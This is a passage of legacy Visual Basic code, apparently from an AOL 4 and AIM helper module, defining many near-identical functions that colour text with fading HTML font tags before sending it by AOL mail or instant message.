        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBluePurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBluePurpleBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueRedBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldBlueYellowBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenPurpleGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenRedGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreenYellowGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyBlueGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyGreenGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyPurpleGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyRedGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailGreyYellowGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("" + Msg + "")
End Function
Function AoL4_MailBoldGreenBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenBlackGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenBlueGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenPurpleGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenRedGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreenYellowGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyBlack(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyBlackGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyBlue(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyBlueGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyGreen(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyGreenGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyPurple(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyPurpleGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyRed(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldGreyRedGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function

Function AoL4_MailBoldGreyYellow(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AoL4_MailBoldGreyYellowGrey(Who, Subj, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_MailSend (Who), (Subj), ("<b>" + Msg + "")
End Function
Function AiM_ImBoldBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("<b>" + Msg + "")
End Function
Function AiM_ImBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackGreenBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackGrey(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackGreyBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackPurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackPurpleBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackedRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackRedBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlackYellowBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueBlack(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueBlackBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueGreen(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueGreenBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBluePurple(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBluePurpleBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueRed(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueRedBlue(Who, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AiM_ImSend (Who), ("" + Msg + "")
End Function
Function AiM_ImBlueYellow(Who, Txt)
a = Len(Txt)
    For b = 1 To a
